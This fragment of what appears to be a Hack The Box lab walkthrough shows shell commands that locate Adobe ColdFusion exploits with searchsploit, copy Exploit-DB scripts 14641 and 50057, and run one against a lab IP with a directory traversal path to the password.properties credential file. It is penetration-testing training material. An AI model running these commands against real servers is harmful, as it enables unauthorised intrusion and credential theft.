...
```shell-session
swmpdnky@htb[/htb]$ searchsploit adobe coldfusion
...
```shell-session
swmpdnky@htb[/htb]$ searchsploit -p 14641
...
```shell-session
swmpdnky@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
swmpdnky@htb[/htb]$ python2 14641.py 
...
```shell-session
swmpdnky@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
...
```shell-session
swmpdnky@htb[/htb]$ searchsploit -p 50057
...
```shell-session
swmpdnky@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
...
```shell-session
swmpdnky@htb[/htb]$ python3 50057.py 
